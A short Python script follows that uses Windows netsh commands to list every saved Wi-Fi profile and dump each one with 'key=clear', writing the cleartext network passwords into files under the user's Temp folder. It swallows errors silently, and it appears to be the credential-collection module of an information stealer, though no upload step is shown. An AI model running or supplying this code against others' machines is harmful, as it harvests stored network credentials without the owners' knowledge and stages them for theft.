import os
import subprocess

def export_wifi_info(temp_path):
    networks = {}
    
    def get_networks():
        try:
            output_networks = subprocess.check_output(["netsh", "wlan", "show", "profiles"]).decode(errors='ignore')
            profiles = [line.split(":")[1].strip() for line in output_networks.split("\n") if "Profil" in line]
            
            for profile in profiles:
                if profile:
                    networks[profile] = subprocess.check_output(["netsh", "wlan", "show", "profile", profile, "key=clear"]).decode(errors='ignore')
        except Exception:
            pass
    
    def save_networks():
        os.makedirs(os.path.join(temp_path, "Wifi"), exist_ok=True)
        if networks:
            for network, info in networks.items():
                with open(os.path.join(temp_path, "Wifi", f"{network}.txt"), "wb") as f:
                    f.write(info.encode("utf-8"))
        else:
            with open(os.path.join(temp_path, "Wifi", "No Wifi Networks Found.txt"), "w") as f:
                f.write("No wifi networks found.")

    get_networks()
    save_networks()

# Example usage:
temp_path = 'C:\\Users\\Raze\\AppData\\Local\\Temp'  # Change this path as needed
export_wifi_info(temp_path)
